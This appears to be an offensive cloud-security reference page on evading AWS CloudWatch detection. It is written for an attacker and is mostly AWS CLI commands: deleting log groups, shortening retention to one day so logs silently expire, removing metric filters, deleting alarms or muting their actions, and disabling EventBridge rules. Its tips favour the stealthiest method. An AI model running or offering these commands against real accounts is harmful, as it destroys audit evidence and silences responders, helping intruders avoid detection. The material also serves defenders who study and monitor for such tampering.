---
title: "CloudWatch: deleting log groups, metric filters, and alarms"
description: "Deleting log groups, alarms, and metric filters to suppress CloudWatch alerting and evidence."
keywords:
  - CloudWatch
  - log group
  - alarm
  - metric filter
  - suppression
---

# CloudWatch

CloudWatch holds application and service logs, the metric filters that turn log patterns into metrics, and the alarms that page a responder. It is both evidence and the alerting path, so deleting log groups removes the record while deleting or disabling alarms removes the notification.

## Delete or expire the logs

```bash
aws logs describe-log-groups
aws logs delete-log-group --log-group-name <lg>
# or silently age everything out to the minimum
aws logs put-retention-policy --log-group-name <lg> --retention-in-days 1
```

## Break the alerting path

```bash
# remove the metric filter that feeds an alarm
aws logs delete-metric-filter --log-group-name <lg> --filter-name <f>
# delete or neuter the alarm itself
aws cloudwatch delete-alarms --alarm-names <a>
aws cloudwatch disable-alarm-actions --alarm-names <a>
# disable the EventBridge rule that routes an event to a responder
aws events disable-rule --name <rule>
```

## Exploitation notes

- `disable-alarm-actions` leaves the alarm present and green while silencing its SNS or Lambda action, which is quieter than deleting it.
- Log groups delivered to a central account (a logging account in an organization) keep the evidence even after the local group is deleted.
- Metric filters are the usual bridge from a log pattern (for example root login) to an alarm; removing the filter blinds the alarm without touching the alarm.

## Tools

- **AWS CLI** (`logs`, `cloudwatch`, `events`): log group, filter, alarm, and rule control.
- **Pacu** (`detection__disruption`): disrupts CloudWatch alongside the other detection services.

## References

- [HackTricks Cloud: AWS defense evasion](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-defense-evasion/index.html)
- [AWS: DeleteLogGroup API](https://docs.aws.amazon.com/AmazonCloudWatchLogs/latest/APIReference/API_DeleteLogGroup.html)
- [AWS: disable-alarm-actions](https://docs.aws.amazon.com/AmazonCloudWatch/latest/APIReference/API_DisableAlarmActions.html)
